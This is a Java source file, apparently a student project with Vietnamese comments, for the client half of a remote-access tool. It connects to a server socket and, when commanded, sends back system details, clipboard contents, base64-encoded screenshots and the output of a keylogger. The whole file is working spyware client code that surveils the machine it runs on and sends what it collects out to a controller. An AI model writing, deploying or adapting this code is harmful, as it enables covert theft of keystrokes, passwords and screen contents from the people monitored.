package Controller;

import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Base64;
import javax.imageio.ImageIO;

public class User {
    public static void main(String[] args) {
        String serverAddress = "127.0.0.2";
        int portNumber = 5254;

        try (
            Socket socket = new Socket(serverAddress, portNumber);
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))
        ) {
            // Gửi thông báo USER tới server
            out.println("USER");

            // Đối tượng để lấy thông tin hệ thống
            SystemInformation systemInfo = new SystemInformation();
            ClipboardReader clipboardReader = new ClipboardReader(); // Đối tượng để đọc clipboard
            KeyLogger keyLogger = new KeyLogger(out); // Đối tượng KeyLogger
            ScreenShot screenshot = new ScreenShot();

            String serverCommand;
            while ((serverCommand = in.readLine()) != null) {
                System.out.println("Command from server: " + serverCommand);
                if ("information".equals(serverCommand)) {
                    StringBuilder info = new StringBuilder();
                    info.append("CPU Info: ").append(systemInfo.getCpuInfo()).append("\n");
                    info.append("Memory Info: ").append(systemInfo.getMemoryInfo()).append("\n");
                    info.append("Disk Info: ").append(systemInfo.getDiskInfo()).append("\n");
                    info.append("Network Info: ").append(systemInfo.getNetworkInfo()).append("\n");

                    String[] infoLines = info.toString().split("\n");
                    for (String line : infoLines) {
                        out.println("INFO:" + line);
                    }
                } else if ("clipboard".equals(serverCommand)) {
                    String clipboardData = clipboardReader.readClipboard();
                    out.println("CLIPBOARD:" + clipboardData);
                } else if ("keylogger".equals(serverCommand)) {
                    // Start keylogger functionality
                    keyLogger.start();
                } else if ("exit".equals(serverCommand)) {
                    keyLogger.stop();
                    break;
                } else if ("screenshot".equals(serverCommand)) {
                    BufferedImage image = ScreenShot.getScreenshot(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    if (image != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        ImageIO.write(image, "png", baos);
                        String base64Image = Base64.getEncoder().encodeToString(baos.toByteArray());
                        out.println("SCREENSHOT:" + base64Image);
                    } else {
                        out.println("SCREENSHOT_ERROR");
                    }
                }
            }
        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
}
